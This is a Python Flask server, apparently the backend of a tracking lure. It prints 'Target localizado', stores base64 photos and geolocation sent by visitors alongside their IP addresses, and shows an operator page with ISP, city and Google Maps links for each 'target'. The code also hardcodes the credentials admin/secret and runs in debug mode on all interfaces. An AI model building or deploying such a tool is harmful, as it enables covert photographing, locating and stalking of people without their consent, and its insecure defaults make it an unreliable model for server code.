from flask import Flask, render_template, request, jsonify, send_from_directory
import os
import base64
from flask_httpauth import HTTPBasicAuth
from datetime import datetime
from xml.etree.ElementTree import Element, SubElement, tostring, ElementTree
import requests
import geoip2.database

app = Flask(__name__)

reader = geoip2.database.Reader('GeoLite2-City.mmdb')
UPLOAD_FOLDER = 'uploads'
XML_FILE = 'data.xml'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

auth = HTTPBasicAuth()

users = {
    "admin": "secret"
}


@app.route('/')
def index():
    print("Target localizado")
    return render_template('index.html')


@auth.get_password
def get_pw(username):
    if username in users:
        return users.get(username)
    return None


@app.route('/upload', methods=['POST'])
def upload():
    image_data = request.json.get('image')
    ip_address = request.remote_addr
    geolocation = request.json.get('geolocation')
    filename = os.path.join(UPLOAD_FOLDER, f"{datetime.now().strftime('%Y%m%d%H%M%S')}.png")
    with open(filename, 'wb') as f:
        f.write(base64.b64decode(image_data.split(',')[1]))

    # Save data to XML
    if os.path.exists(XML_FILE):
        tree = ElementTree()
        tree.parse(XML_FILE)
        root = tree.getroot()
    else:
        root = Element('entries')

    entry_elem = SubElement(root, 'entry')
    ip_elem = SubElement(entry_elem, 'ip')
    ip_elem.text = ip_address
    geo_elem = SubElement(entry_elem, 'geolocation')
    geo_elem.text = geolocation
    file_elem = SubElement(entry_elem, 'filename')
    file_elem.text = filename

    tree = ElementTree(root)
    tree.write(XML_FILE)

    return jsonify({'status': 'success'})

# @app.route('/consulta')
# @auth.login_required
# def consulta():
#     # Read data from XML
#     tree = ElementTree()
#     tree.parse(XML_FILE)
#     data = []
#     for entry in tree.findall('entry'):
#         ip = entry.find('ip').text
#         filename = entry.find('filename').text
        
#         # Obter informações do IP usando geoip2
#         try:
#             response = reader.city(ip)
#             provider = response.traits.isp or "Desconhecido"
#             city = response.city.name or "Desconhecido"
#             state = response.subdivisions.most_specific.name or "Desconhecido"
#             country = response.country.name or "Desconhecido"
#         except:
#             provider = "Desconhecido"
#             city = "Desconhecido"
#             state = "Desconhecido"
#             country = "Desconhecido"
        
#         geolocation = entry.find('geolocation').text
#         lat, lon = geolocation.split(", ")
#         lat = lat.split(": ")[1]
#         lon = lon.split(": ")[1]
#         google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"

#         data.append((filename, google_maps_link, f"{provider}, {city}, {state}, {country}, {ip}"))
#     return render_template('consulta.html', data=data)

@app.route('/consulta')
@auth.login_required
def consulta():
    tree = ElementTree()
    tree.parse(XML_FILE)
    data = []
    for entry in tree.findall('entry'):
        ip = entry.find('ip').text
        filename = entry.find('filename').text

        try:
            response = reader.city(ip)
            provider = response.traits.isp or "Desconhecido"
            city = response.city.name or "Desconhecido"
            state = response.subdivisions.most_specific.name or "Desconhecido"
            country = response.country.name or "Desconhecido"
        except:
            provider = "Desconhecido"
            city = "Desconhecido"
            state = "Desconhecido"
            country = "Desconhecido"

        geolocation = entry.find('geolocation').text
        lat, lon = geolocation.split(", ")
        lat = lat.split(": ")[1]
        lon = lon.split(": ")[1]
        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"

        data.append((filename, google_maps_link, f"{provider}, {city}, {state}, {country}, {ip}"))

    return render_template('consulta.html', data=data)


@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
